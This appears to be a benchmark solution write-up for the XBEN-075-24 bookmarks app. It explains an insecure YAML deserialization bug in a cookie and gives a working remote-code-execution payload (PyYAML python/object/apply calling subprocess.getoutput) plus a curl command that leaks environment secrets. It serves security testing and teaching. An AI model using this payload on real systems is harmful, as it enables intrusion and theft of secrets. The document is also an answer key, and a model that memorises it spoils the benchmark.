# XBEN-075-24 — URL Bookmarks - YAML

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Insecure deserialization -> Remote Code Execution, via unsafe
`yaml.load(..., Loader=yaml.Loader)` on an attacker-controlled cookie.

## Summary

`app/website/app/routes.py`'s `/list`, `/add` and `/delete` routes all base64-decode the
`bookmarks` cookie and deserialize it with the fully unsafe `yaml.Loader`:

```python
urls = request.cookies.get('bookmarks')
urls = base64.b64decode(request.cookies.get('bookmarks'))
# Here is the bug.
# Deserializing arbitrary objects with yaml allows to execute arbitrary code.
urls = yaml.load(urls, Loader=yaml.Loader)
```

`yaml.Loader` (as opposed to `yaml.SafeLoader`) supports PyYAML's `!!python/object`,
`!!python/object/apply`, etc. tags, which can instantiate arbitrary Python classes and call
arbitrary functions during deserialization — a well-known PyYAML RCE primitive. Since the
`bookmarks` cookie is entirely client-controlled, and nothing validates or signs it, an
attacker can hand-craft a YAML document that constructs a `UrlObj` (the class the template
expects, `app.models.UrlObj`, so `list_urls.html`'s `{{ item.name }}` rendering keeps
working) whose `name` field is populated by calling `subprocess.getoutput()` — executing an
arbitrary shell command and capturing its stdout directly into the rendered page. The flag
is stored as an environment variable (`os.environ["FLAG"] = ...` in `app/__init__.py`), so
running `env` is enough to read it.

## Exploit

1. Build the malicious YAML payload (constructs a `UrlObj` whose `name` attribute is the
   output of `subprocess.getoutput("env")`), then base64-encode it for the cookie:

```bash
python3 - <<'EOF'
import base64

payload = """- !!python/object:app.models.UrlObj
  name: !!python/object/apply:subprocess.getoutput ["env"]
  url: http://example.com
"""
print(base64.b64encode(payload.encode()).decode())
EOF
# -> LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5nZXRvdXRwdXQgWyJlbnYiXQogIHVybDogaHR0cDovL2V4YW1wbGUuY29tCg==
```

2. Send it as the `bookmarks` cookie (any `user` cookie also required by the route) to
   `/list`, which triggers `yaml.load()` on it:

```bash
curl -s "http://localhost:63380/list" \
  -H "Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5nZXRvdXRwdXQgWyJlbnYiXQogIHVybDogaHR0cDovL2V4YW1wbGUuY29tCg==; user=attacker"
```
